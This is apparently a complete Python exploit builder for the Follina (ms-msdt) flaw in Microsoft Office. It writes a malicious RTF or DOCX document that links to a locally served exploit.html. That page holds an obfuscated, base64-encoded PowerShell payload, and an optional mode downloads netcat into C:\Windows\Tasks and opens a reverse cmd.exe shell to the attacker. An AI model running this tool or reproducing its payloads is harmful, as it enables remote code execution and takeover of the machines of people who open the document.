#!/usr/bin/env python3

import argparse
from cgitb import enable
import os
import zipfile
import http.server
import socketserver
import base64
from time import sleep, perf_counter
import threading as th
from urllib.parse import urlparse
import tempfile
import shutil
import netifaces
import ipaddress
import random
import string
import socket
import threading


parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="calc",
    help="command to run on the target (default: calc)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./report.doc",
    help="output maldoc file (default: ./report.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="0",
    help="port to serve reverse shell on",
)

parser.add_argument(
    "--type",
    "-t",
    default="rtf",
    help="type of document",
    action='store', 
    dest='type', 
    choices={"docx", "rtf"}
)


def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file),
                       os.path.relpath(
                            os.path.join(root, file),
                            path
                       ))


def generate_docx(payload_url):
    const_docx_name = "clickme.docx"

    with open("src/document.xml.rels.tpl", "r") as f:
        tmp = f.read()

    payload_rels = tmp.format(payload_url = payload_url)

    if not os.path.exists("src/docx/word/_rels"):
        os.makedirs("src/docx/word/_rels")

    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
        f.write(payload_rels)

    with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir("src/docx", zipf)

    print(f"Generated '{const_docx_name}' in current directory")

    return const_docx_name

    
def generate_rtf(payload_url):
    s = payload_url
    docuri_hex = "".join("{:02x}".format(ord(c)) for c in s)
    docuri_hex_wide = "00".join("{:02x}".format(ord(c)) for c in s)

    url_moniker_length = (int(len(docuri_hex_wide)/2)+3+24) 
    #calculate the length of the wide string, divide by 2 to account for the wide characters, add 3 null bytes and finally add 24 as per MS-CBF specifications
    url_moniker_length_encoded = f"{url_moniker_length:x}"

    composite_moniker_length = int(len(docuri_hex_wide)/2)+3+95 
    #calculate the length of the wide string, divide by 2 to account for the wide characters, add 3 null bytes and finally add rest of header size
    composite_moniker_length_encoded = f"{composite_moniker_length:x}"
    const_rtf_name = "clickme.rtf"

    null_padding_ole_object = "00"*(196-int(len(docuri_hex_wide)/2))
    null_padding_link_object = "00"*(565-int(len(docuri_hex_wide)/2)-int(len(docuri_hex)/2))

    with open("src/rtf/clickme.rtf.tpl", "r") as f:
        tmp = f.read()

    payload_rtf = tmp.replace('payload_url_deobf', payload_url) # cannot use format due to {} characters in RTF
    payload_rtf = payload_rtf.replace('{payload_url_hex}', docuri_hex)
    payload_rtf = payload_rtf.replace('{composite_moniker_length_encoded}', composite_moniker_length_encoded)
    payload_rtf = payload_rtf.replace('{url_moniker_length_encoded}', url_moniker_length_encoded)
    payload_rtf = payload_rtf.replace('{payload_url_wide}', docuri_hex_wide)
    payload_rtf = payload_rtf.replace('{null_padding_ole_object}', null_padding_ole_object)
    payload_rtf = payload_rtf.replace('{null_padding_link_object}', null_padding_link_object)

    with open(const_rtf_name, "w") as f:
        f.write(payload_rtf)

    print(f"Generated '{const_rtf_name}' in current directory")    

    return const_rtf_name

def main(args):

    # Parse the supplied interface
    # This is done so the maldoc knows what to reach out to.
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()
    
    payload_url = f"http://{serve_host}:{args.port}/exploit.html"
    print(f"[+] Payload URL: {payload_url}")

    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
        encoded_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('UTF-8') # Powershell life...
        payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''
    if args.command:
                # Original PowerShell execution variant
        command = args.command.replace("\"", "\\\"")
        encoded_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('UTF-8') # Powershell life...
        payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''
    
    # Prepare the mal file
    if args.type == "docx":
        payload_name = generate_docx(payload_url)
        print(f"payload name: {payload_name}")

    if args.type == "rtf":
        payload_name = generate_rtf(payload_url)
        print(f"payload name: {payload_name}")

    # Prepare the HTML payload
    if not os.path.exists("www"):
        os.makedirs("www")

    with open("src/exploit.html.tpl", "r") as f:
        tmp = f.read()
    
    payload_html = tmp.format(payload = payload)

    with open("www/exploit.html", "w") as f:
        f.write(payload_html)
    
    print("Generated 'exploit.html' in 'www' directory")

    enable_webserver = True

    if enable_webserver is True:
        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory="www", **kwargs)

        print(f"Serving payload on {payload_url}")
        with socketserver.TCPServer((serve_host, args.port), Handler) as httpd:
            httpd.serve_forever()
 